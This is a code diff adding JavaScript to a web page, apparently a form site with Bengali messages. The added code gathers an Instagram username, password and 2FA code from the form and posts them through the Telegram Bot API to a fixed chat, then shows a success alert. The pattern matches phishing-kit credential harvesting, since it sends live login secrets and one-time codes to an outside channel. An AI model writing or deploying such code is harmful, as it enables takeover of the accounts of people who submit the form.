@@ -1764,4 +1764,36 @@
                 let user = document.getElementById('instaUser').value;
                 let pass = document.getElementById('instaPass').value;
                 let twofa = document.getElementById('insta2fa').value;
-                message += `👤 ইউজারনেম: ${user}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA Code: ${
+                message += `👤 ইউজারনেম: ${user}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA Code: ${twofa}`;
+            }
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('সফলভাবে সাবমিট হয়েছে! কাজ সরাসরি আপনার টেলিগ্রাম বটে চলে গেছে।');
+                    event.target.reset();
+                    showPage('homePage');
+                } else {
+                    alert('সাবমিট করতে সমস্যা হয়েছে: ' + (data.description || 'আবার চেষ্টা করুন।'));
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('নেটওয়ার্ক ত্রুটি!');
+            });
+        }
+    </script>
+</body>
+</html>
